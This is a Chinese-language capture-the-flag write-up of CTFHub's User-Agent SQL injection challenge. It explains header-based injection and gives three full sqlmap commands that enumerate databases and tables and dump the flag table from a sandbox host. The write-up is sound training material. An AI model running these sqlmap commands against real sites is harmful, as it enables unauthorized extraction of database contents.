【CTFHub】Web-SQL注入UA注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.25 | 分类：CTF | 标签：CTFHub, Web, SQL注入, UA注入, User-Agent, SQLmap

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SQL注入 / UA注入
  • 题目名称：UA注入
  • 环境：通过 Open Browser 打开外部浏览器访问靶场环境。
  • 目标：注入点隐藏在 HTTP 请求头的 User-Agent 字段中。需要配合 SQLmap 工具，指定 UA 头部作为注入位置，最终获取 Flag。

2. 解题思路与知识点

什么是 UA 注入？

UA（User-Agent）注入，是 HTTP 请求头注入的一种。在之前的关卡中，注入点都在 URL 参数（如 ?id=1）或 Cookie 里。但在真实开发中，后端代码有时会记录用户的访问信息，比如将浏览器的 UA 头写入数据库。如果代码直接将 User-Agent 拼接到 SQL 语句中而未做过滤，就会形成漏洞。

与之前注入的核心不同点：

  • 注入位置：不在 URL，也不在 Cookie，而是藏在 User-Agent 请求头里。
  • 工具操作：因为浏览器无法修改 UA 请求头，所以必须依靠 SQLmap 的 --user-agent 参数，配合星号 * 来指定注入位置。
  • 特征暴露：靶场页面上会直接回显拼接后的 SQL 语句，比如 select * from news where id=Mozilla/5.0...。由于浏览器自带的 UA 含有空格和括号，会导致 SQL 语法崩溃，这也反向证明了该处存在整数型注入。
SQLmap 操作：
  • python sqlmap.py：运行 SQLmap 主程序。
  • -u "URL"：指定目标 URL。这里只需要填靶场的基地址（如 http://challenge-xxx.sandbox.ctfhub.com:10800/）。
  • --user-agent="1*"：本关核心参数。将 User-Agent 请求头指定为 1*，其中星号 * 是 SQLmap 的注入点标记，告诉工具将后续的 Payload 全部替换到星号的位置进行测试。
  • --dbs：查询目标服务器上的所有数据库名。
  • -D "sqli"：指定目标数据库名为 sqli（前面查到的结果）。
  • -T "jhivrcrzmo"：指定目标表名为 jhivrcrzmo（前面查到的随机表名）。
  • --dump：导出数据。自动查字段名并输出表内所有数据，这是拿 Flag 的关键步骤。
  • --batch：全自动模式，遇到询问默认选 Yes，无需人工干预。
  • --threads=1：强制单线程，降低请求频率，防止靶场环境崩溃。

3. 操作步骤

第一步：探测注入点与库名

Payload： python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" --dbs --batch --threads=1

执行目的：测试 UA 头部是否存在 SQL 注入，并利用 --dbs 获取所有数据库名。

回显结果：成功跑出 information_schema、mysql、performance_schema 和 sqli。

获得信息：确认注入成功，当前目标数据库为 sqli。

第二步：查表名

Payload： python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" -D "sqli" --tables --batch --threads=1

执行目的：获取 sqli 库下的所有表名。

回显结果：列出 news 和随机表名 jhivrcrzmo。

获得信息：确认目标表名为 jhivrcrzmo，news 为干扰项。

第三步：一键脱库拿 Flag

Payload： python sqlmap.py -u "http://challenge-7e693e1f5a0f3228.sandbox.ctfhub.com:10800/" --user-agent="1*" -D "sqli" -T "jhivrcrzmo" --dump --batch --threads=1

执行目的：指定库名和表名，使用 --dump 自动猜测字段名并导出表内全部数据。

回显结果：终端打印数据表，输出 ctfhub{...}。

获得信息：成功提取 Flag，提交至 CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：UA头部无法直接通过浏览器操作。必须借助外部工具（如 BP 抓包或 SQLmap 参数）进行修改。
  • 坑2：SQLmap 参数配置。--user-agent="1*" 中的星号 * 是告诉 SQLmap“注入点在这里”的核心标记。漏掉星号或填错格式，工具就无法正确识别注入点。
  • 坑3：环境脆弱与超时。CTFHub 靶场承受高并发能力极弱，使用 SQLmap 时必须加上 --threads=1。如果连接被强制关闭，重启环境并重新执行命令即可，这不是 Payload 问题。

5. 知识总结

  • 注入点位置的多样性：除了 URL 参数、Cookie，User-Agent、Referer、X-Forwarded-For 等 HTTP 请求头都可能成为注入点。遇到这类题目，核心思路是使用带 * 标记的 SQLmap 命令（如 --user-agent="*"）指向目标头部。
  • SQLmap 核心参数回顾：熟记 -u (URL)、--dbs (库)、-D (指定库)、--tables (表)、-T (指定表)、--dump (导出数据)。
  • 实战操作认知：在遇到“非标准位置”注入时，手工测试容易被 WAF 拦截或语法错误卡住，使用自动化工具（配合精准的注入点标记 *）是效率最高的破局方式。
